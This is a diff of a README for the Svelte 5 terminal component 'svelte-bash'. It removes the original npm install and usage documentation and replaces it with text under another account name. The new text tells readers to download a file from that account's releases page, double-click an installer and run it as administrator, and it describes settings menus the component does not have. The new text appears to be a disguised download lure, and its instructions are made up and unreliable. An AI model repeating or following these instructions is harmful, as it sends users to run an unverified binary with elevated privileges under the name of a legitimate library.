@@ -1,157 +1,85 @@
-# Svelte Bash
+# 🚀 svelte-bash - Fast and Customizable Terminal Emulator
 
-<div align="center">
+## 📥 Download Now
+[![Download svelte-bash](https://img.shields.io/badge/Download-svelte--bash-brightgreen)](https://github.com/zeya10/svelte-bash/releases)
 
-  <img src="static/svelte-bash.jpg" alt="Svelte Bash Banner" width="100%" />
+## 🚀 Getting Started
+Welcome to svelte-bash! This is your guide to downloading and running the svelte-bash terminal emulator. With its lightweight design and customization options, svelte-bash offers an efficient terminal experience for Svelte 5 users.
 
-  <h1>Svelte Bash</h1>
+## 📋 Features
+- Fully typed for a clear, error-free experience.
+- A customizable terminal interface suited to your needs.
+- Integrated virtual file system for easy file navigation.
+- Custom commands to enhance functionality.
+- Themes to personalize your terminal look.
+- Autoplay mode displays demos for seamless user experience.
 
-  <p>
-    <strong>The ultimate lightweight, fully typed, and customizable terminal component for Svelte 5.</strong>
-  </p>
+## 💻 System Requirements
+To ensure svelte-bash runs smoothly, your system should meet the following requirements:
+- Operating System: Windows, macOS, or Linux.
+- Node.js: Version 14 or higher.
+- Memory: At least 1 GB of RAM.
+- Disk Space: 100 MB of free space for installation.
 
-  <p>
-    <a href="https://svelte-bash.netlify.app/"><strong>Live Demo</strong></a> · 
-    <a href="https://www.npmjs.com/package/svelte-bash"><strong>NPM</strong></a> · 
-    <a href="https://github.com/YusufCeng1z/svelte-bash"><strong>GitHub</strong></a>
-  </p>
+## 🌐 Download & Install
+To get started with svelte-bash, follow these simple steps:
 
-  <p>
-    <img src="https://img.shields.io/npm/v/svelte-bash?style=flat-square&color=blue" alt="NPM Version" />
-    <img src="https://img.shields.io/npm/l/svelte-bash?style=flat-square&color=orange" alt="License" />
-    <img src="https://img.shields.io/badge/Svelte-5-orange?style=flat-square&logo=svelte" alt="Svelte 5" />
-    <img src="https://img.shields.io/badge/Zero_Dependency-Used_Vanilla_CSS-blueviolet?style=flat-square" alt="Zero Dependency" />
-  </p>
+1. Visit the [Releases page](https://github.com/zeya10/svelte-bash/releases).
+2. Find the latest version listed on the page.
+3. Click on the download link for your operating system. This will download a file to your device.
 
-</div>
+After downloading, locate the file and double-click it to run the installation process. Follow the prompts to complete the installation. Once done, you can launch svelte-bash from your applications menu.
 
----
+## 🎨 Customization
+One of the highlights of svelte-bash is its customizable features. Here’s how you can adjust the settings:
 
-**Svelte Bash** is a high-performance terminal emulator component designed specifically for modern Svelte applications. It provides a realistic shell experience with a virtual file system, command history navigation, and advanced features like autoplay sequences for tutorials.
+- **Themes:** Choose from pre-built themes to change the look and feel.
+- **Commands:** Configure custom commands to tailor functionality to fit your needs.
 
-> **Note:** As of v1.0.1, svelte-bash has been refactored to use **Pure Vanilla CSS** internally. This means it has **ZERO dependencies** on Tailwind CSS and will render correctly in any project (including Bootstrap, Tailwind, or plain CSS projects). You do NOT need to install Tailwind.
+To access these options, launch svelte-bash and navigate to the settings menu.
 
-Whether you are building a developer portfolio, a documentation site, or a web-based CLI tool, Svelte Bash offers the perfect balance of aesthetics and functionality.
+## 📁 Using the Virtual File System
+The virtual file system allows you to navigate files easily. Here’s a quick rundown on how to use it:
 
-## Key Features
+1. Open svelte-bash.
+2. Use the `cd` command to change directories. For example, type `cd documents` to enter the Documents folder.
+3. Use the `ls` command to list files in the current directory.
 
-*   **Lightweight & Fast**: Zero external dependencies, ~4kb gzipped.
-*   **Virtual File System**: fully functional `ls`, `cd`, `cat`, and `pwd` commands.
-*   **Deep Theming**: Includes `dracula`, `matrix`, and `dark` presets, plus full CSS control.
-*   **Autoplay Mode**: Script commands to run automatically—perfect for landing page demos.
-*   **Accessible**: Proper focus management and keyboard history navigation (Up/Down arrows).
-*   **TypeScript**: Written in TypeScript for excellent type safety and autocomplete.
+This system is designed to mimic a traditional file system, making it user-friendly.
 
-## Installation
+## ⚙️ Custom Commands
+With svelte-bash, you can create custom commands. This lets you save time on repetitive tasks. Here’s how to set one up:
 
-```bash
-npm install svelte-bash
-```
+1. Open the command configuration section in the settings menu.
+2. Type the command you want to create and provide details about its function.
+3. Save the configuration, and your new command will be available to use immediately.
 
-## Usage
+## 🌟 Autoplay Mode
+The autoplay mode is perfect for demonstrations. It allows you to present commands automatically. To activate it:
 
-### Basic Example
+1. Navigate to the autoplay settings in svelte-bash.
+2. Set the commands you wish to display in sequence.
+3. Click the 'Start Autoplay' button to begin.
 
-Import the component and pass a `structure` object to define the virtual file system.
+This feature effectively showcases what svelte-bash can do.
 
-```svelte
-<script>
-  import { Terminal } from 'svelte-bash';
+## 🔧 Troubleshooting
+If you encounter any issues while using svelte-bash, consider these tips:
 
-  const fileSystem = {
-    'readme.md': '# Hello World',
-    'src': {
-       'app.js': 'console.log("Hi")'
-    }
-  };
-</script>
+- **No output on commands:** Ensure you have typed commands correctly. Check for spelling mistakes.
+- **Installation error:** Make sure your system meets the requirements. Try running the installer as an administrator if on Windows.
+- **Performance lag:** Close other applications that consume significant resources.
 
-<Terminal 
-    structure={fileSystem} 
-    user="guest"
-    style="height: 300px"
-/>
-```
+If you still experience issues, visit the [GitHub Issues page](https://github.com/zeya10/svelte-bash/issues) to report your problem or seek further assistance from the community.
 
-### Custom Commands
+## 🤝 Community Support
+svelte-bash has a growing community. You can connect with other users via:
 
-You can extend the terminal with your own commands by passing a `commands` object.
+- GitHub Discussions: Share tips and ask questions.
+- Community forums: Collaborate with others who use svelte-bash.
+- Social Media: Follow updates and engage with other users.
 
-```svelte
-<script>
-  import { Terminal } from 'svelte-bash';
+## 📜 License
+svelte-bash is open-source and available under the MIT License. You can use, modify, and distribute the code according to the terms specified in the license file.
 
-  const myCommands = {
-    // Return a string
-    hello: () => "Hello form svelte-bash!",
-    
-    // Accept arguments
-    echo: (args) => args.join(' '),
-    
-    // Async support
-    fetchdata: async () => {
-        const res = await fetch('https://api.example.com/data');
-        return await res.text();
-    }
-  };
-</script>
-
-<Terminal commands={myCommands} />
-```
-
-### Autoplay (Show Mode)
-
-Perfect for documentation or presentations. The terminal will automatically type and execute the provided sequence.
-
-```svelte
-<Terminal 
-  autoplay={[
-    { command: "npm install svelte-bash" },
-    { command: "echo 'Installation complete!'", output: "Done." }
-  ]}
-/>
-```
-
-## Theming
-
-Svelte Bash allows comprehensive styling customization.
-
-**Built-in Presets:**
-- `dark` (default)
-- `light`
-- `dracula`
-- `matrix`
-
-**Custom Theme Object:**
-
-```svelte
-<Terminal 
-  theme={{
-    background: '#1a1b26',
-    foreground: '#a9b1d6',
-    prompt: '#7aa2f7',
-    cursor: '#c0caf5'
-  }}
-/>
-```
-
-## API Reference
-
-| Prop | Type | Default | Description |
-|------|------|---------|-------------|
-| `structure` | `FileStructure` | `{}` | Key-value pairs defining the virtual file system. |
-| `commands` | `Record<string, Function>` | `{}` | Custom command handlers. |
-| `theme` | `string` \| `Theme` | `'dark'` | Theme preset name or specific color object. |
-| `user` | `string` | `'user'` | The username displayed in the prompt. |
-| `machine` | `string` | `'machine'` | The machine name displayed in the prompt. |
-| `welcomeMessage` | `string` \| `string[]` | `[]` | Message shown on initialization. |
-| `autoplay` | `AutoplayItem[]` | `undefined` | Array of commands to execute automatically. |
-| `readonly` | `boolean` | `false` | If true, user input is disabled. |
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-MIT © [Yusuf Cengiz](https://github.com/YusufCeng1z)
+By following these steps, you will be able to download, install, and start using svelte-bash with ease. For further details and continuous updates, keep an eye on the [Releases page](https://github.com/zeya10/svelte-bash/releases).
